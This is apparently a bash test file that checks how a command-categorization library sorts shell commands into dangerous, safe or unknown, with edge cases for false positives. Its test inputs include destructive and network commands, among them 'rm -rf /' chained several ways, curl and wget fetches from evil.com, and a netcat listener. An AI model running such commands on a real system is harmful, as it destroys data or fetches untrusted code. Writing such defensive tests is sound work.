#!/usr/bin/env bash
# Test command categorization boundaries

source scripts/lib/command-categories.sh

test_cmd() {
    local cmd="$1"
    local expected="$2"
    local actual
    actual=$(categorize_command "$cmd")
    if [[ "$actual" == "$expected" ]]; then
        printf "  ✓ '%s' -> %s\n" "$cmd" "$actual"
    else
        printf "  ✗ '%s' -> %s (expected %s)\n" "$cmd" "$actual" "$expected"
        return 1
    fi
}

echo "Testing DESTRUCTIVE_KEYWORDS boundaries..."
test_cmd "rm -rf /" "dangerous"
test_cmd "sudo ls" "dangerous"
test_cmd "eval 'rm -rf /'" "dangerous"
test_cmd "env LS_COLORS=none ls" "dangerous"

echo "Testing INTERPRETER_KEYWORDS boundaries..."
test_cmd "python3 script.py" "dangerous"
test_cmd "python2 script.py" "dangerous"
test_cmd "python3.11 script.py" "dangerous"
test_cmd "node16 index.js" "dangerous"
test_cmd "php script.php" "dangerous"
test_cmd "node index.js" "dangerous"
test_cmd "bash install.sh" "dangerous"
test_cmd "composer install" "dangerous"
test_cmd "bundle exec" "dangerous"

echo "Testing SAFE_KEYWORDS boundaries..."
test_cmd "build" "safe"
test_cmd "build.sh" "unknown"
test_cmd "python_script.sh" "unknown"

echo "Testing NETWORK_KEYWORDS..."
test_cmd "curl http://evil.com/s.sh" "dangerous"
test_cmd "wget http://evil.com/s.sh" "dangerous"
test_cmd "nc -l 4444" "dangerous"

echo "Testing false positives for NETWORK/INTERPRETER..."
test_cmd "curl.sh" "unknown"
test_cmd "my-curl" "unknown"
test_cmd "wget_script.py" "unknown"
test_cmd "python.sh" "unknown"
test_cmd "python3.11.sh" "unknown"
test_cmd "node16.js" "unknown"

echo "Testing chained commands..."
test_cmd "ls; rm -rf /" "dangerous"
test_cmd "echo hi && curl http://evil.com" "dangerous"
test_cmd "sleep 10 | rm -rf /" "dangerous"
test_cmd "python3.11 -c 'import os; os.system(\"rm -rf /\")'" "dangerous"

echo "Testing administrative commands..."
test_cmd "su - root" "dangerous"
test_cmd "systemctl status" "dangerous"
